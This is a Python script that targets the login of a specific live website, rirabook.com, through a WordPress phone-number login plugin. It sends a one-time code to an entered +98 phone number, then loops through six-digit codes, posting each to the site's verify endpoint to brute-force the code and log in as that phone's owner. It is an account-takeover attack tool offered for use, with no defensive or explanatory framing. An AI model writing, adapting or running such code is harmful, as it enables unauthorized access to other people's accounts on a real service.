import time
import requests
from colorama import Fore
from os import system
import nonce_cod
system('cls')

# domain : https://rirabook.com/?login=true&page=1&redirect_to=https%3A%2F%2Frirabook.com%2F

def banner():
    print(Fore.BLUE+"""
            ███                      █████                       █████     
           ░░░                      ░░███                       ░░███      
 ████████  ████  ████████   ██████   ░███████   ██████   ██████  ░███ █████
░░███░░███░░███ ░░███░░███ ░░░░░███  ░███░░███ ███░░███ ███░░███ ░███░░███ 
 ░███ ░░░  ░███  ░███ ░░░   ███████  ░███ ░███░███ ░███░███ ░███ ░██████░  
 ░███      ░███  ░███      ███░░███  ░███ ░███░███ ░███░███ ░███ ░███░░███ 
 █████     █████ █████    ░░████████ ████████ ░░██████ ░░██████  ████ █████
░░░░░     ░░░░░ ░░░░░      ░░░░░░░░ ░░░░░░░░   ░░░░░░   ░░░░░░  ░░░░ ░░░░░ 
                                                                        (c) Rirabook . All rights reserved""")


banner()

i = nonce_cod.once_kid_suop(kid='')
print(i)

nonce = input('nonce code :')
system('cls')

P_number = int(input("Enter Phone number +98"))
ip = requests.post("https://icanhazip.com").text

url = 'https://rirabook.com/wp-admin/admin-ajax.php'
json = {'accountkit': 0,
        'firebase': 0,
        'code': "1"}

data = {'action':'digits_check_mob',
        'countrycode':'+98', # decoded url
        'mobileNo':P_number,
        'csrf':nonce,
        'login':1,
        'username':'',
        'email':'',
        'captcha':'',
        'captcha_ses':'',
        'digits':1,
        'json':1,
        'whatsapp':0,
        'mobmail':P_number,
        'dig_otp':'',
        'dig_nounce':nonce,
        'digits_redirect_page':'https://rirabook.com/'}

sned_otp = requests.post(url=url,json=json,data=data).text

if sned_otp == '{"accountkit":0,"firebase":0,"code":"1"}':
    print(Fore.GREEN+'[*] OTP Code Sned phone | ',"Ip :",ip)
    time.sleep(10)
else:
    print(Fore.RED+'[*] OTP Code Sned Fail')
    time.sleep(5)
    system('cls')

def OTP_Test():
    sh = 100000
    while True:
        sh += 1

        if sh == 999999:
            print(Fore.RED+'[*] OTP test fail')

        print(Fore.YELLOW+"[*]",sh,"Test OTP Code | ","Ip :",ip)

        url_vrify = 'https://rirabook.com/wp-admin/admin-ajax.php'

        json_vrify = {'success': True,
                      'data': {'code':11}}

        data_vrify = {'action':'digits_verifyotp_login',
                      'countrycode':'%2B98',
                      'mobileNo':P_number,
                      'otp':sh,
                      'dig_ftoken':-1,
                      'csrf':nonce,
                      'dtype':1,
                      'digits':1,
                      'rememberMe':False}

        Vrify_otp = requests.post(url=url_vrify,data=data_vrify,json=json_vrify).text

    
        if Vrify_otp == "{'success': True,'data': {'code':11}}":
            print(Fore.GREEN+'[*] Phone OTP Code is',sh)
            time.sleep(60)
        else:
            system('cls')
            print(Fore.RED+'[*] OTP test fail')


OTP_Test()
